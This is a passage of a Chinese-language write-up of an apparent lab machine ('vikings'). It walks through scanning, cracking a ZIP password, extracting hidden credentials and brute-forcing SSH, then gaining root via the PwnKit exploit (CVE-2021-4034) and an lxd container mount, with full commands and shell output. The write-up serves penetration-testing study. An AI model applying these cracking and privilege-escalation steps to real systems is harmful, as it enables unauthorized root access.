site/</span><br><span class="line">|_</span><br><span class="line">|_http-title: Index of /</span><br><span class="line">|_http-server-header: Apache/2.4.29 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:18:B9:F7 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device <span class="built_in">type</span>: general purpose|storage-misc</span><br><span class="line">Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), Synology DiskStation Manager 5.X (90%), Netgear RAIDiator 4.X (87%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:netgear:raidiator:4.2.28</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.8 (97%), Linux 5.0 - 5.4 (97%), Linux 5.0 - 5.5 (95%), Linux 2.6.32 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.9 (91%), Linux 3.4 - 3.10 (91%), Linux 5.1 (91%), Linux 2.6.32 - 3.10 (91%), Linux 2.6.32 - 3.13 (91%)</span><br><span class="line">No exact OS matches <span class="keyword">for</span> host (<span class="built_in">test</span> conditions non-ideal).</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Host: 127.0.0.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.62 ms 192.168.159.155</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 135.84 seconds</span><br></pre></td></tr></table></figure>
<h3 id="web-信息收集">1.3. Web 信息收集</h3>
<p>扫目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u <span class="string">&quot;http://192.168.159.155/site/&quot;</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,txt,json,html -f -t 50</span><br></pre></td></tr></table></figure>
<p>得 <code>/site/war.txt</code> <span
class="math inline">\(\Rightarrow\)</span> <code>/war-is-over</code>
<span class="math inline">\(\Rightarrow\)</span> base64 编码的信息</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192019744.png" /></p>
<p>PK <span class="math inline">\(\Rightarrow\)</span> ZIP 文件</p>
<blockquote>
<p>ZIP Archive (zip)，文件头：50 4B 03 04
ascii码部分是PK，可以直接根据PK判断是zip文件，也有可能是doc文件 <a
href="https://ohmygodlin.github.io/ctf/misc/2018/08/30/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/">常见文件格式
| 把不懂的记下来，就懂了</a></p>
</blockquote>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192019746.png" /></p>
<p>尝试将其直接解码为文件【<a
href="https://base64.guru/converter/decode/file">Base64 to File | Base64
Decode | Base64 Converter | Base64</a>】</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192019747.png" /></p>
<p>下载 application.zip，解压发现需要密码，尝试用 fcrackzip 爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p ../rockyou.txt -u application.zip</span><br></pre></td></tr></table></figure>
<p>没破解出来，换 john</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zip2john application.zip &gt; application_pass</span><br><span class="line">john application_pass --wordlist=../rockyou.txt </span><br></pre></td></tr></table></figure>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192028935.png" /></p>
<p>得 <code>ragnarok123      (application.zip/king)</code> ，解压后得
king，是个图片，尝试隐写分析</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192030690.png" /></p>
<p>又嵌入了个 zip 压缩包……用 <code>binwalk -e king --run-as=root</code>
分解</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192031577.png" /></p>
<p>得</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">//FamousBoatbuilder_floki@vikings                                     </span><br><span class="line">//f@m0usboatbuilde</span><br></pre></td></tr></table></figure>
<p>可能是 ssh 登录信息，用 hydra 爆破试试</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192038386.png" /></p>
<p>得 <code>login: floki   password: f@m0usboatbuilde7</code></p>
<h2 id="渗透攻击">2. 渗透攻击</h2>
<h3 id="获取-shell">2.1. 获取 shell</h3>
<p>ssh 登录 <code>floki/f@m0usboatbuilde7</code></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192041679.png" /></p>
<p>提示没明白……但 <code>/home/ragnar</code> 下找到了一个 flag</p>
<h3 id="提权">2.2. 提权</h3>
<h4 id="polkit-提权">2.2.1. Polkit 提权</h4>
<p>上传 linpeas.sh 执行后找到个 CVE-2021-4034</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404192201526.png" /></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+] [CVE-2021-4034] PwnKit   </span><br><span class="line">   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt</span><br><span class="line">   Exposure: probable</span><br><span class="line">   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro</span><br><span class="line">   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>Polkit（以前称为 PolicyKit）</code>是一个用于在类 <code>Unix</code> 操作系统中控制系统范围权限的组件。它为非特权进程与特权进程通信提供了一种有组织的方式。也可以使用 <code>polkit</code> 执行具有提升权限的命令，使用命令 <code>pkexec</code> 后加要执行的命令（具有<code>root</code>权限）。
CVE-2021-4034 漏洞分析： <a
href="https://blog.qualys.com/vulnerabilities-threat-research/2022/01/25/pwnkit-local-privilege-escalation-vulnerability-discovered-in-polkits-pkexec-cve-2021-4034">PwnKit:
Local Privilege Escalation Vulnerability Discovered in polkit’s pkexec
(CVE-2021-4034) | Qualys Security Blog</a> <a
href="https://xz.aliyun.com/t/10870?time__1311=mq%2BxB7W%3DD%3DDsD7Ce0%3De0QG8Uj2B4YuDAD&amp;alichlgref=https%3A%2F%2Fcn.bing.com%2F#toc-4">CVE-2021-4034
深入分析及漏洞复现 - 先知社区</a></p>
</blockquote>
<p>下载后传至靶机提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">floki@vikings:/tmp/CVE-2021-4034-main$ <span class="built_in">ls</span> -al</span><br><span class="line">total 40</span><br><span class="line">drwxr-xr-x  3 floki floki 4096 Jan 30  2022 .</span><br><span class="line">drwxrwxrwt 13 root  root  4096 Apr 19 17:42 ..</span><br><span class="line">-rw-r--r--  1 floki floki  292 Jan 30  2022 cve-2021-4034.c</span><br><span class="line">-rwxr-xr-x  1 floki floki  305 Jan 30  2022 cve-2021-4034.sh</span><br><span class="line">drwxr-xr-x  2 floki floki 4096 Jan 30  2022 dry-run</span><br><span class="line">-rw-r--r--  1 floki floki  114 Jan 30  2022 .gitignore</span><br><span class="line">-rw-r--r--  1 floki floki 1071 Jan 30  2022 LICENSE</span><br><span class="line">-rw-r--r--  1 floki floki  469 Jan 30  2022 Makefile</span><br><span class="line">-rw-r--r--  1 floki floki  339 Jan 30  2022 pwnkit.c</span><br><span class="line">-rw-r--r--  1 floki floki 3419 Jan 30  2022 README.md</span><br><span class="line">floki@vikings:/tmp/CVE-2021-4034-main$ make</span><br><span class="line">cc -Wall --shared -fPIC -o pwnkit.so pwnkit.c</span><br><span class="line">cc -Wall    cve-2021-4034.c   -o cve-2021-4034</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;module UTF-8// PWNKIT// pwnkit 1&quot;</span> &gt; gconv-modules</span><br><span class="line"><span class="built_in">mkdir</span> -p GCONV_PATH=.</span><br><span class="line"><span class="built_in">cp</span> -f /bin/true GCONV_PATH=./pwnkit.so:.</span><br><span class="line">floki@vikings:/tmp/CVE-2021-4034-main$ <span class="built_in">ls</span> -al</span><br><span class="line">total 68</span><br><span class="line">drwxr-xr-x  4 floki floki 4096 Apr 19 17:42  .</span><br><span class="line">drwxrwxrwt 13 root  root  4096 Apr 19 22:05  ..</span><br><span class="line">-rwxrwxr-x  1 floki floki 8360 Apr 19 17:42  cve-2021-4034</span><br><span class="line">-rw-r--r--  1 floki floki  292 Jan 30  2022  cve-2021-4034.c</span><br><span class="line">-rwxr-xr-x  1 floki floki  305 Jan 30  2022  cve-2021-4034.sh</span><br><span class="line">drwxr-xr-x  2 floki floki 4096 Jan 30  2022  dry-run</span><br><span class="line">-rw-rw-r--  1 floki floki   33 Apr 19 17:42  gconv-modules</span><br><span class="line">drwxrwxr-x  2 floki floki 4096 Apr 19 17:42 <span class="string">&#x27;GCONV_PATH=.&#x27;</span></span><br><span class="line">-rw-r--r--  1 floki floki  114 Jan 30  2022  .gitignore</span><br><span class="line">-rw-r--r--  1 floki floki 1071 Jan 30  2022  LICENSE</span><br><span class="line">-rw-r--r--  1 floki floki  469 Jan 30  2022  Makefile</span><br><span class="line">-rw-r--r--  1 floki floki  339 Jan 30  2022  pwnkit.c</span><br><span class="line">-rwxrwxr-x  1 floki floki 8088 Apr 19 17:42  pwnkit.so</span><br><span class="line">-rw-r--r--  1 floki floki 3419 Jan 30  2022  README.md</span><br><span class="line">floki@vikings:/tmp/CVE-2021-4034-main$ ./cve-2021-4034</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),1000(floki)</span><br><span class="line"><span class="comment"># /bin/bash</span></span><br><span class="line">root@vikings:/tmp/CVE-2021-4034-main<span class="comment"># cd /root/</span></span><br><span class="line">root@vikings:/root<span class="comment"># ls -al</span></span><br><span class="line">total 48</span><br><span class="line">drwx------  5 root root 4096 Sep  4  2021 .</span><br><span class="line">drwxr-xr-x 24 root root 4096 Apr 19 14:48 ..</span><br><span class="line">lrwxrwxrwx  1 root root    9 Sep  3  2021 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc</span><br><span class="line">drwx------  3 root root 4096 Sep  3  2021 .cache</span><br><span class="line">drwxr-xr-x  3 root root 4096 Sep  3  2021 .<span class="built_in">local</span></span><br><span class="line">-rw-r--r--  1 root root  148 Aug 17  2015 .profile</span><br><span class="line">lrwxrwxrwx  1 root root    9 Sep  3  2021 .python_history -&gt; /dev/null</span><br><span class="line">-rw-r--r--  1 root root   66 Sep  3  2021 .selected_editor</span><br><span class="line">drwx------  2 root root 4096 Sep  3  2021 .ssh</span><br><span class="line">-rw-------  1 root root 8887 Sep  4  2021 .viminfo</span><br><span class="line">-rw-------  1 root root   33 Sep  3  2021 root.txt</span><br><span class="line">root@vikings:/root<span class="comment"># cat root.txt </span></span><br><span class="line">f0b98d4387ff6da77317e582da98bf31</span><br></pre></td></tr></table></figure>
<p>直接执行 <code>cve-2021-4034.sh</code> 亦可！</p>
<h4 id="lxd-提权">2.2.2. lxd 提权</h4>
<blockquote>
<p><a
href="https://www.cnblogs.com/jhinjax/p/17078938.html">lxd组的提权方法 -
野荷 - 博客园</a></p>
</blockquote>
<p>下载镜像【<a
href="https://github.com/saghul/lxd-alpine-builder">GitHub -
saghul/lxd-alpine-builder: Build Alpine Linux images for
LXD</a>】上传到靶机，提权</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lxd init  <span class="comment"># lxd 先初始化，否则可能出现没有 storage pool【存储池】</span></span><br><span class="line">lxc image import alpine-v3.12-x86_64-20200902_1515.tar.gz --<span class="built_in">alias</span>  image_name</span><br><span class="line">lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">lxc start ignite</span><br><span class="line">lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line"></span><br><span class="line"><span class="built_in">chroot</span>  /mnt/root  <span class="comment"># 获取root的全部权限</span></span><br></pre></td></tr></table></figure>
<p>注意，lxd 初始化报错的解决</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Error: Failed to create network <span class="string">&#x27;lxdbr0&#x27;</span>: open /proc/sys/net/ipv6/conf/lxdbr0/autoconf: no such file or directory</span><br></pre></td></tr></table></figure>
<p>直接将 ipv6 设为 <code>none</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none</span><br></pre></td></tr></table></figure>
<p>具体操作</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">floki@vikings:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 7116</span><br><span class="line">drwxrwxrwt 13 root  root     4096 Apr 19 18:07 .</span><br><span class="line">drwxr-xr-x 24 root  root     4096 Apr 19 14:48 ..</span><br><span class="line">-rw-rw-r--  1 floki floki 3259593 Apr 17 09:58 alpine-v3.13-x86_64-20210218_0139.tar.gz</span><br><span class="line">drwxr-xr-x  4 floki floki    4096 Apr 19 17:42 CVE-2021-4034-main</span><br><span class="line">-rw-r--r--  1 floki floki    4022 Apr 19 17:41 CVE-2021-4034-main.tar.gz</span><br><span class="line">drwxrwxrwt  2 root  root     4096 Apr 19 14:49 .font-unix</span><br><span class="line">drwxrwxrwt  2 root  root     4096 Apr 19 14:49 .ICE-unix</span><br><span class="line">-rwxrwxr-x  1 floki floki  860549 Apr 19 17:25 linpeas.sh</span><br><span class="line">-rwxrwxr-x  1 floki floki 3104768 Apr 19 17:25 pspy64</span><br><span class="line">drwx------  3 root  root     4096 Apr 19 14:49 systemd-private-0c115463bada414694c0cc37f807be6c-apache2.service-8wg52S</span><br><span class="line">drwx------  3 root  root     4096 Apr 19 14:49 systemd-private-0c115463bada414694c0cc37f807be6c-systemd-resolved.service-Tv16zF</span><br><span class="line">drwx------  3 root  root     4096 Apr 19 14:49 systemd-private-0c115463bada414694c0cc37f807be6c-systemd-timesyncd.service-vUUiIA</span><br><span class="line">drwxrwxrwt  2 root  root     4096 Apr 19 14:49 .Test-unix</span><br><span class="line">drwx------  2 floki floki    4096 Apr 19 17:29 tmux-1000</span><br><span class="line">drwx------  2 root  root     4096 Apr 19 14:49 vmware-root_819-4290101131</span><br><span class="line">drwxrwxrwt  2 root  root     4096 Apr 19 14:49 .X11-unix</span><br><span class="line">drwxrwxrwt  2 root  root     4096 Apr 19 14:49 .XIM-unix</span><br><span class="line">floki@vikings:/tmp$ lxd init</span><br><span class="line">Would you like to use LXD clustering? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Do you want to configure a new storage pool? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line">Name of the new storage pool [default=default]: </span><br><span class="line">Name of the storage backend to use (btrfs, <span class="built_in">dir</span>, lvm) [default=btrfs]: </span><br><span class="line">Create a new BTRFS pool? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line">Would you like to use an existing block device? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Size <span class="keyword">in</span> GB of the new loop device (1GB minimum) [default=15GB]: </span><br><span class="line">Would you like to connect to a MAAS server? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Would you like to create a new <span class="built_in">local</span> network bridge? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line">What should the new bridge be called? [default=lxdbr0]: </span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: </span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: </span><br><span class="line">Would you like LXD to be available over the network? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Would you like stale cached images to be updated automatically? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>] </span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Error: Failed to create network <span class="string">&#x27;lxdbr0&#x27;</span>: open /proc/sys/net/ipv6/conf/lxdbr0/autoconf: no such file or directory</span><br><span class="line">floki@vikings:/tmp$ lxd init</span><br><span class="line">Would you like to use LXD clustering? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Do you want to configure a new storage pool? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line">Name of the new storage pool [default=default]: </span><br><span class="line">Name of the storage backend to use (btrfs, <span class="built_in">dir</span>, lvm) [default=btrfs]: </span><br><span class="line">Create a new BTRFS pool? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line">Would you like to use an existing block device? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Size <span class="keyword">in</span> GB of the new loop device (1GB minimum) [default=15GB]: </span><br><span class="line">Would you like to connect to a MAAS server? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Would you like to create a new <span class="built_in">local</span> network bridge? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>]: </span><br><span class="line">What should the new bridge be called? [default=lxdbr0]: </span><br><span class="line">What IPv4 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: </span><br><span class="line">What IPv6 address should be used? (CIDR subnet notation, “auto” or “none”) [default=auto]: none</span><br><span class="line">Would you like LXD to be available over the network? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">Would you like stale cached images to be updated automatically? (<span class="built_in">yes</span>/no) [default=<span class="built_in">yes</span>] </span><br><span class="line">Would you like a YAML <span class="string">&quot;lxd init&quot;</span> preseed to be printed? (<span class="built_in">yes</span>/no) [default=no]: </span><br><span class="line">floki@vikings:/tmp$ lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="built_in">alias</span>  image_name</span><br><span class="line">Error: Image with same fingerprint already exists</span><br><span class="line">floki@vikings:/tmp$ lxc init image_name ignite -c security.privileged=<span class="literal">true</span></span><br><span class="line">Creating ignite</span><br><span class="line">floki@vikings:/tmp$ lxc config device add ignite mydevice disk <span class="built_in">source</span>=/ path=/mnt/root recursive=<span class="literal">true</span></span><br><span class="line">Device mydevice added to ignite</span><br><span class="line">floki@vikings:/tmp$ lxc start ignite</span><br><span class="line">floki@vikings:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/bash</span><br><span class="line">floki@vikings:/tmp$ lxc <span class="built_in">exec</span> ignite /bin/sh</span><br><span class="line">~ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root)</span><br><span class="line">~ <span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span>: can<span class="string">&#x27;t open &#x27;</span>/root/root.txt<span class="string">&#x27;: No such file or directory</span></span><br><span class="line"><span class="string">~ # cd /</span></span><br><span class="line"><span class="string">/ # ls -al</span></span><br><span class="line"><span class="string">total 0</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           114 Apr 19 18:18 .</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           114 Apr 19 18:18 ..</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           878 Feb 18  2021 bin</span></span><br><span class="line"><span class="string">drwxr-xr-x    7 root     root           420 Apr 19 18:18 dev</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           586 Apr 19 18:18 etc</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root             0 Feb 18  2021 home</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           398 Feb 18  2021 lib</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root            28 Feb 18  2021 media</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root             8 Apr 19 18:18 mnt</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root             0 Feb 18  2021 opt</span></span><br><span class="line"><span class="string">dr-xr-xr-x  215 root     root             0 Apr 19 18:18 proc</span></span><br><span class="line"><span class="string">drwx------    1 root     root            24 Apr 19 18:19 root</span></span><br><span class="line"><span class="string">drwxr-xr-x    4 root     root           200 Apr 19 18:18 run</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root          1676 Feb 18  2021 sbin</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root             0 Feb 18  2021 srv</span></span><br><span class="line"><span class="string">dr-xr-xr-x   13 root     root             0 Apr 19 17:15 sys</span></span><br><span class="line"><span class="string">drwxrwxrwt    1 root     root            36 Apr 19 18:18 tmp</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root            54 Feb 18  2021 usr</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root            86 Apr 19 18:18 var</span></span><br><span class="line"><span class="string">/ # cd /root</span></span><br><span class="line"><span class="string">~ # ls -al</span></span><br><span class="line"><span class="string">total 4</span></span><br><span class="line"><span class="string">drwx------    1 root     root            24 Apr 19 18:19 .</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           114 Apr 19 18:18 ..</span></span><br><span class="line"><span class="string">-rw-------    1 root     root            50 Apr 19 18:20 .ash_history</span></span><br><span class="line"><span class="string">~ # cd /mnt/root</span></span><br><span class="line"><span class="string">/mnt/root # ls -al</span></span><br><span class="line"><span class="string">total 1851492</span></span><br><span class="line"><span class="string">drwxr-xr-x   24 root     root          4096 Apr 19 14:48 .</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root             8 Apr 19 18:18 ..</span></span><br><span class="line"><span class="string">-rw-------    1 root     root             0 Apr 19 14:48 .viminfo</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Sep  4  2021 bin</span></span><br><span class="line"><span class="string">drwxr-xr-x    4 root     root          4096 Sep  4  2021 boot</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Sep  3  2021 cdrom</span></span><br><span class="line"><span class="string">drwxr-xr-x   19 root     root          3880 Apr 19 18:08 dev</span></span><br><span class="line"><span class="string">drwxr-xr-x  105 root     root          4096 Sep  4  2021 etc</span></span><br><span class="line"><span class="string">drwxr-xr-x    4 root     root          4096 Sep  3  2021 home</span></span><br><span class="line"><span class="string">lrwxrwxrwx    1 root     root            34 Sep  3  2021 initrd.img -&gt; boot/initrd.img-4.15.0-154-generic</span></span><br><span class="line"><span class="string">lrwxrwxrwx    1 root     root            34 Sep  3  2021 initrd.img.old -&gt; boot/initrd.img-4.15.0-154-generic</span></span><br><span class="line"><span class="string">drwxr-xr-x   23 root     root          4096 Sep  3  2021 lib</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Sep  3  2021 lib64</span></span><br><span class="line"><span class="string">drwx------    2 root     root         16384 Sep  3  2021 lost+found</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Aug  6  2020 media</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Aug  6  2020 mnt</span></span><br><span class="line"><span class="string">drwxr-xr-x    3 root     root          4096 Sep  3  2021 opt</span></span><br><span class="line"><span class="string">dr-xr-xr-x  215 root     root             0 Apr 19 14:49 proc</span></span><br><span class="line"><span class="string">drwx------    5 root     root          4096 Sep  4  2021 root</span></span><br><span class="line"><span class="string">drwxr-xr-x   30 root     root           960 Apr 19 18:18 run</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root         12288 Sep  4  2021 sbin</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Sep  3  2021 snap</span></span><br><span class="line"><span class="string">drwxr-xr-x    2 root     root          4096 Aug  6  2020 srv</span></span><br><span class="line"><span class="string">-rw-------    1 root     root     1895825408 Sep  3  2021 swap.img</span></span><br><span class="line"><span class="string">dr-xr-xr-x   13 root     root             0 Apr 19 17:15 sys</span></span><br><span class="line"><span class="string">drwxrwxrwt   13 root     root          4096 Apr 19 18:07 tmp</span></span><br><span class="line"><span class="string">drwxr-xr-x   11 root     root          4096 Sep  4  2021 usr</span></span><br><span class="line"><span class="string">drwxr-xr-x   14 root     root          4096 Sep  3  2021 var</span></span><br><span class="line"><span class="string">lrwxrwxrwx    1 root     root            31 Sep  3  2021 vmlinuz -&gt; boot/vmlinuz-4.15.0-154-generic</span></span><br><span class="line"><span class="string">lrwxrwxrwx    1 root     root            31 Sep  3  2021 vmlinuz.old -&gt; boot/vmlinuz-4.15.0-154-generic</span></span><br><span class="line"><span class="string">/mnt/root # cd /root</span></span><br><span class="line"><span class="string">~ # ls -al</span></span><br><span class="line"><span class="string">total 4</span></span><br><span class="line"><span class="string">drwx------    1 root     root            24 Apr 19 18:19 .</span></span><br><span class="line"><span class="string">drwxr-xr-x    1 root     root           114 Apr 19 18:18 ..</span></span><br><span class="line"><span class="string">-rw-------    1 root     root            86 Apr 19 18:21 .ash_history</span></span><br><span class="line"><span class="string">~ # cd /mnt/root/root</span></span><br><span class="line"><span class="string">/mnt/root/root # ls -al</span></span><br><span class="line"><span class="string">total 48</span></span><br><span class="line"><span class="string">drwx------    5 root     root          4096 Sep  4  2021 .</span></span><br><span class="line"><span class="string">drwxr-xr-x   24 root     root          4096 Apr 19 14:48 ..</span></span><br><span class="line"><span class="string">lrwxrwxrwx    1 root     root             9 Sep  3  2021 .bash_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r--    1 root     root          3106 Apr  9  2018 .bashrc</span></span><br><span class="line"><span class="string">drwx------    3 root     root          4096 Sep  3  2021 .cache</span></span><br><span class="line"><span class="string">drwxr-xr-x    3 root     root          4096 Sep  3  2021 .local</span></span><br><span class="line"><span class="string">-rw-r--r--    1 root     root           148 Aug 17  2015 .profile</span></span><br><span class="line"><span class="string">lrwxrwxrwx    1 root     root             9 Sep  3  2021 .python_history -&gt; /dev/null</span></span><br><span class="line"><span class="string">-rw-r--r--    1 root     root            66 Sep  3  2021 .selected_editor</span></span><br><span class="line"><span class="string">drwx------    2 root     root          4096 Sep  3  2021 .ssh</span></span><br><span class="line"><span class="string">-rw-------    1 root     root          8887 Sep  4  2021 .viminfo</span></span><br><span class="line"><span class="string">-rw-------    1 root     root            33 Sep  3  2021 root.txt</span></span><br><span class="line"><span class="string">/mnt/root/root # cat root.txt</span></span><br><span class="line"><span class="string">f0b98d4387ff6da77317e582da98bf31</span></span><br><span class="line"><span class="string">/mnt/root/root # cd ~</span></span><br><span class="line"><span class="string">~ # chroot  /mnt/root</span></span><br><span class="line"><span class="string">root@ignite:/# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string">root@ignite:/# ls -al</span></span><br><span class="line"><span class="string">total 1851496</span></span><br><span class="line"><span class="string">drwxr-xr-x  24 root root       4096 Apr 19 14:48 .</span></span><br><span class="line"><span class="string">drwxr-xr-x  24 root root       4096 Apr 19 14:48 ..</span></span><br><span class="line"><span class="string">-rw-------   1 root root          0 Apr 19 14:48 .viminfo</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Sep  4  2021 bin</span></span><br><span class="line"><span class="string">drwxr-xr-x   4 root root       4096 Sep  4  2021 boot</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Sep  3  2021 cdrom</span></span><br><span class="line"><span class="string">drwxr-xr-x  19 root root       3880 Apr 19 18:08 dev</span></span><br><span class="line"><span class="string">drwxr-xr-x 105 root root       4096 Sep  4  2021 etc</span></span><br><span class="line"><span class="string">drwxr-xr-x   4 root root       4096 Sep  3  2021 home</span></span><br><span class="line"><span class="string">lrwxrwxrwx   1 root root         34 Sep  3  2021 initrd.img -&gt; boot/initrd.img-4.15.0-154-generic</span></span><br><span class="line"><span class="string">lrwxrwxrwx   1 root root         34 Sep  3  2021 initrd.img.old -&gt; boot/initrd.img-4.15.0-154-generic</span></span><br><span class="line"><span class="string">drwxr-xr-x  23 root root       4096 Sep  3  2021 lib</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Sep  3  2021 lib64</span></span><br><span class="line"><span class="string">drwx------   2 root root      16384 Sep  3  2021 lost+found</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Aug  6  2020 media</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Aug  6  2020 mnt</span></span><br><span class="line"><span class="string">drwxr-xr-x   3 root root       4096 Sep  3  2021 opt</span></span><br><span class="line"><span class="string">dr-xr-xr-x 212 root root          0 Apr 19 14:49 proc</span></span><br><span class="line"><span class="string">drwx------   5 root root       4096 Sep  4  2021 root</span></span><br><span class="line"><span class="string">drwxr-xr-x  30 root root        960 Apr 19 20:37 run</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root      12288 Sep  4  2021 sbin</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Sep  3  2021 snap</span></span><br><span class="line"><span class="string">drwxr-xr-x   2 root root       4096 Aug  6  2020 srv</span></span><br><span class="line"><span class="string">-rw-------   1 root root 1895825408 Sep  3  2021 swap.img</span></span><br><span class="line"><span class="string">dr-xr-xr-x  13 root root          0 Apr 19 17:15 sys</span></span><br><span class="line"><span class="string">drwxrwxrwt  13 